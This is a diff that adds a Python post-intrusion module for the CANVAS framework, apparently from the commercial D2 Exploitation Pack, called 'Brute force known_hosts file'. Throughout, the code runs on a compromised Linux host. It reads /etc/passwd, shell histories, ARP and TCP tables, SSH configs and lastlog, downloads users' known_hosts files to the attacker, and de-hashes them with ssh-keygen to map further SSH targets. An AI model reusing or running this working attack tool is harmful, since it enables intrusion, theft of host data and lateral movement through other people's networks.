@@ -1,0 +1,516 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+import sys, os, socket, string, getopt, struct
+
+sys.path.append(".")
+
+from canvasexploit import canvasexploit
+from MOSDEFShellServer import MSSgeneric
+from MOSDEF.linuxremoteresolver import x86linuxremoteresolver
+from MOSDEF.win32remoteresolver import win32remoteresolver
+
+from exploitutils import *
+import libs.canvasos as canvasos
+import canvasengine
+
+NAME="Brute force known_hosts file"
+DESCRIPTION="Brute force known_hosts file"
+DOCUMENTATION={}
+DOCUMENTATION["Commandline Example"]="runmodule d2sec_unssh -O sshkeygen:/usr/bin/ssh-keygen -O savedir:dirname"
+
+VERSION="1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Post-Intrusion"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+affectsList=["Tools"]
+
+runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
+runExploit = canvasengine.runExploit
+
+class Data:
+	def __init__(self, savefile):
+		self.savefile = savefile
+
+	def add_data(self, a, b):
+		s = a + ":" + b
+
+		if os.path.exists(self.savefile):
+			f = open(self.savefile, "r")
+			c = f.readlines()
+			for d in c:
+				if s in d:
+					return
+			f.close()
+
+		f = open(self.savefile, "a")
+		f.write(s + "\n")
+		f.close()
+
+	def del_data(self):
+		pass
+
+	def find_data(self):
+		pass
+
+class theexploit(canvasexploit):
+	def __init__(self):
+		canvasexploit.__init__(self)
+		self.supportedNodeArgs = ["linuxNode"]
+		self.name = NAME
+		self.node = ""
+		self.ips = []
+		self.khosts = []
+		self.sshconfig = []
+		self.sshkeygen = "/usr/bin/ssh-keygen"
+		self.savefile = ""
+
+	def read_remote_file(self, file):
+		""" reading file on remote box """
+
+		n = "\n"
+		a = self.node.runcommand("cat %s" % file)
+		b = []
+
+		if len(a) > 0:
+			if n in a:
+				b = a.split(n)
+			else:
+				b.append(a)
+		else:
+			b = []
+
+		return b
+
+	# find known_hosts files on box and check if ipaddr 
+	# are hashed
+	def find_user_file(self, file, tab):
+		""" finding known_hosts files """
+
+		n = ["/bin/false", "/sbin/nologin", "/bin/sync", "/bin/sh", "/usr/sbin/nologin"]
+
+		a = self.read_remote_file("/etc/passwd")
+		if not a:
+			return
+
+		i = 0
+		
+		while i < len(a):
+			if len(a[i]) > 0:
+				b = a[i].split(":")
+				if b[6] in n:
+					i += 1
+					continue
+			
+				s = ""
+
+				if len(b[5]) > 0:
+					#s = "%s/.ssh/known_hosts" % b[5]
+					s = "%s/.ssh/%s" % (b[5], file)
+				else:
+					i += 1
+					continue
+
+				O_RDONLY = self.node.shell.libc.getdefine('O_RDONLY')
+				f = self.node.shell.open(s, O_RDONLY, 0644)
+
+				if f < 0:
+					i += 1
+					continue
+
+				c = b[0] + ":" + s
+				if c not in self.khosts:
+					tab.append(c)
+
+				self.node.shell.close(f)
+
+			i += 1
+
+		return 
+	
+	def find_known_hosts(self):
+		self.find_user_file("known_hosts", self.khosts)
+
+	def find_ssh_config(self):
+		self.find_user_file("ssh_config", self.sshconfig)
+	
+	def check_ssh_keygen(self):
+		""" checking ssh_keygen """
+		if os.path.exists(self.sshkeygen):
+			return 1
+		return 0
+	
+	def check_hash(self, file):
+		""" checking if known_hosts file is hashed """
+
+		a = self.read_remote_file(file)
+		if not a:
+			return
+
+		d = a[0].split()
+		if "|1|" in d[0] and "=|" in d[0]:
+			return 1
+
+		return 0
+
+
+	def etc_hosts(self):
+		""" reading /etc/hosts """
+
+		a = self.read_remote_file("/etc/hosts")
+		if not a:
+			return
+
+		for b in a:
+			if len(b) < 2 or b[0] == "#" or b[0] == "f" or b[0] == ":":
+				continue
+			b = b.split()
+			if b[0] == "127.0.0.1":
+				continue
+			if b[0] not in self.ips:
+				self.ips.append(b[0])
+
+		return
+
+	def shell_history(self):
+		""" reading shell history """
+		
+		n = ["/bin/false", "/sbin/nologin", "/bin/sync", "/bin/sh", "/usr/sbin/nologin"]
+
+		a = self.read_remote_file("/etc/passwd")
+		if not a:
+			return
+
+		for b in a:	
+			if not b:
+				continue
+			b = b.split(":")
+			if b[6] in n:
+				continue
+
+			h = ""
+			
+			if b[6] == "/bin/bash":
+				h = "%s/.bash_history" % b[5]
+			else:
+				continue
+
+			c = self.read_remote_file(h)
+			if not c:
+				continue	
+
+			for b in c:
+				if not "ssh " in b:
+					continue
+				e = b.split()
+
+				if "." in c:
+					d = ""
+					i = 1
+
+					while not "." in d:
+						d = e[len(e)-i]
+						i += 1
+
+					if "@" in d:
+						d = d.split("@")[1]
+
+					d = d.split('.')
+					if len(d) == 4:
+						if d not in self.ips:
+							self.ips.append(d)
+
+				else:
+					# bug: if it's 'ssh <host> <command>'
+					d = e[len(e)-1]
+
+					if "@" in d:
+						d = d.split("@")[1]
+
+					if d not in self.ips:
+						self.ips.append(d)
+
+		return
+
+	def proc_net_tcp(self):
+		""" reading /proc/net/tcp """
+
+		a = self.read_remote_file("/proc/net/tcp")
+		if not a:
+			return
+
+		for b in a:
+			if not b:
+				continue
+			b = b.split()
+
+			if ":0016" not in b[2]:
+				continue
+
+			b = b[2].split(':')[0]
+			b = int(b,16)
+			b = ".".join(map(str,(b & 0xff, (b >> 8) & 0xff, (b >> 16) & 0xff, (b >> 24) & 0xff)))
+
+			if b not in self.ips:
+				self.ips.append(b)
+
+		return
+
+	def get_arp_table(self):
+		""" reading /proc/net/arp """
+
+		a = self.read_remote_file("/proc/net/arp")
+		if not a:
+			return
+
+		for b in a:
+			if not b:
+				continue
+			if "IP address" in b:
+				continue
+			b = b.split()
+
+			if b[0] not in self.ips:
+				self.ips.append(b[0])
+
+	def get_network_ip(self):
+		a = self.node.runcommand("PATH=/bin:/sbin:/usr/bin:/usr/sbin ifconfig -a|grep 'inet'|grep -v 'inet6'")
+		
+		a = a.split("\n")
+		for b in a:
+			if not b:
+				break
+			i = b.split(':')[1]
+			i = i.split()[0]
+			if "cast" not in b:
+				n = b.split(':')[2]
+			else:
+				n = b.split(':')[3]
+
+			if i == "127.0.0.1":
+				continue
+
+			i = struct.unpack('>L', socket.inet_aton(i))[0]
+			n = struct.unpack('>L', socket.inet_aton(n))[0]
+
+			c = i & n 
+
+			network = ".".join(map(str,((c >> 24) & 0xff, (c >> 16) & 0xff, (c >> 8) & 0xff, c & 0xff)))
+			
+			network = network.split(".")
+
+			j = 1
+
+			while j < 255:
+				c = "%s.%s.%s.%d" % (network[0], network[1], network[2], j)
+				if c not in self.ips:
+					self.ips.append(c)
+				j += 1
+	
+		return
+	
+	def list_who(self):
+		a = self.node.runcommand("PATH=/bin:/sbin:/usr/bin:/usr/sbin w -f|grep ssh|cut -d'@' -f 2|grep -v 'tty'|grep -v 'pts'")		
+
+		a = a.split("\n")
+		if not a:
+			return
+
+		for b in a:
+			if not b:
+				continue
+
+			if b == "127.0.0.1":
+				continue
+
+			if b not in self.ips:
+				self.ips.append(b)
+
+		return
+
+	def list_last(self):
+		a = self.node.runcommand("PATH=/bin:/sbin:/usr/bin:/usr/sbin lastlog|cut -d' ' -f 16")
+
+		a = a.split("\n")
+		if not a:
+			return
+
+		for b in a:
+			if not b:
+				continue
+
+			if b == "127.0.0.1":
+				continue
+
+			if b not in self.ips:
+				self.ips.append(b)
+
+		return
+
+	def check_etc_sshdconfig(self):
+		#uid = os.getuid()
+		#gid = os.getgid()
+
+		#if uid != 0 and gid != 0:
+		#	return
+
+		a = self.read_remote_file("/etc/ssh/sshd_config")
+		if not a:
+			return
+
+		for d in a:
+			if d.find("AllowUsers") >= 0:
+				d = d.split()
+				for i in d:
+					if i.find(",") >= 0:
+						i = i.split(",")
+						for j in i:
+							if j.find("@") >= 0:
+								j = j.split("@")[1]
+								if j not in self.ips:
+									self.ips.append(j)
+
+					elif i.find("@") >= 0:
+						i = i.split("@")[1]
+						if i not in self.ips:
+							self.ips.append(i)
+
+	def check_sshconfig(self, file):
+		a = self.read_remote_file(file)
+		if not a:
+			return
+
+		for d in a:
+			if d.find("Host ") >= 0:
+				d = d.split()
+				for i in d:
+					if i.find("Host") >= 0 or i.find("*") >= 0 or i.find("?") >= 0:
+						continue
+
+					if i not in self.ips:
+						self.ips.append(i)
+
+	def check_etc_sshconfig(self):
+		self.check_sshconfig("/etc/ssh/ssh_config")
+
+	def check_user_sshconfig(self):
+		for f in self.sshconfig:
+			self.check_sshconfig(f)
+	
+	def make_list_ip(self):
+		self.etc_hosts()
+		self.shell_history()
+		self.proc_net_tcp()
+		self.get_network_ip()
+		self.get_arp_table()
+		self.list_who()
+		self.list_last()
+		self.check_etc_sshdconfig()
+		self.check_etc_sshconfig()
+		self.check_user_sshconfig()
+
+	def run_bruteforce(self):
+		i = self.check_ssh_keygen()
+		if i == 0:
+			self.log("can't find %s" % self.sshkeygen)
+			self.log("use our ssh-keygen")
+			return
+			
+		self.find_known_hosts()
+		if len(self.khosts) == 0:
+			self.log("not found known_hosts files")
+			return
+		
+		self.find_ssh_config()
+
+		self.make_list_ip()
+
+		for a in self.khosts:
+			self.log("[#] %s" % a)
+			(user, k) = a.split(":")
+
+			d = "%s/%s" % (self.savefile, user)
+			if not os.path.exists(d):
+				os.mkdir(d)
+			if not os.path.exists("%s/known_hosts" % d):
+				self.node.shell.download(k, "%s/known_hosts" % d)
+
+			k = "%s/known_hosts" % d
+			
+			data = Data("%s/d2sec_unssh.log" % d)
+
+			i = self.check_hash(k)
+			if i == 1:
+				for i in self.ips:
+					f = os.popen("%s -F %s" % (self.sshkeygen, i), 'r')
+					b = f.read()
+					f.close()
+
+					if len(b) > 0:
+						b = b.split("\n")
+						self.log(b[0])
+						data.add_data(a, b[0].split()[2])
+
+			else:
+				self.log("addrip not hashed")
+				e = self.read_remote_file(k)
+				if not e:
+					return
+
+				for c in e:
+					if not c:
+						continue
+					c = c.split()
+					data.add_data(a, c[0])
+
+		self.log("see %s/d2sec_unssh.log" % d)
+		return
+
+	def getargs(self):
+		self.sshkeygen=self.argsDict.get("sshkeygen",self.sshkeygen)
+		self.savefile=self.argsDict.get("savefile",self.savefile)
+
+	def run(self):
+		self.setInfo("%s (in progress)"%(NAME))
+		self.getargs()
+
+		self.log("!! This module may take a few minutes!!")
+
+		for node in self.argsDict["passednodes"]:
+			type = node.nodetype
+			if type not in self.supportedNodeArgs[0]:
+				self.log("%s node type not supported"%type)
+				continue
+
+			self.node = node
+
+			if not self.savefile:
+				self.log("Specify a folder to save data")
+				return
+
+			self.run_bruteforce()
+
+		self.setInfo("%s - done (success)"%(NAME))
+		return 
+	
+	def usage(self):
+		print "Usage: %s -O options:value\n" % (sys.argv[0])
+		print "with options:"
+		print "  -O sshkeygen:<path of keygen>"
+		print "  -O savedir:<dirname>\n"
+
+		print "Note: a ssh-keygen binary is given with d2sec_unssh\n"
+
+		sys.exit(0)
+
+if __name__=="__main__":
+	print "This module is meant to be run only within CANVAS"
+
